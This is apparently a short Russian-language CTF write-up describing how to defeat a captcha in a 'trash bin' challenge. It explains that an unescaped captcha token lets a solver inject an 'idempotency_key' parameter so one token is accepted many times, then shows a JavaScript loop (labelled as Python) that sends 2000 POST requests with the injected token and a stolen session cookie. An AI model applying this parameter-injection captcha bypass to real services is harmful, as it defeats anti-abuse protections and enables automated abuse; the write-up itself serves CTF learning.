Надо автоматизировать открытие мусорок, обойдя каптчу.

В файле `check_bin.php` видно, что у токена каптчи слабая валидация, и он не экранируется при вставке в запрос на сервер каптчи. Можно использовать это, чтобы добавить в запрос параметр `idempotency_key=<constant_UUID>`. Этот параметр позволяет сделать так, чтобы сервер каптчи одобрял много запросов на проверку с одинаковым токеном.

Далее в браузере на странице https://t-aandb-j58o5s3y.spbctf.net/?open=1 перехатываем токен каптчи и не даём ему улететь на сервер (это можно сделать, поставив брейкпоинт в девтулзах). Там же нужно взять куку сессии.

Затем отправляем запрос с «хакнутым» токеном в каждую мусорку, чтобы открыть её:

```python
for (let binNum = 1; binNum <= 2000; binNum++) {
  fetch(host, {
    method: 'POST',
    headers: {
      Cookie: cookies,
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: `open=${binNum}&token=${encodeURIComponent(`${captchaResponse}&idempotency_key=550e8400-e29b-41d4-a716-446655440000`)}`,
    redirect: 'manual',
  })
}
```

После этого флаг появится на главной странице


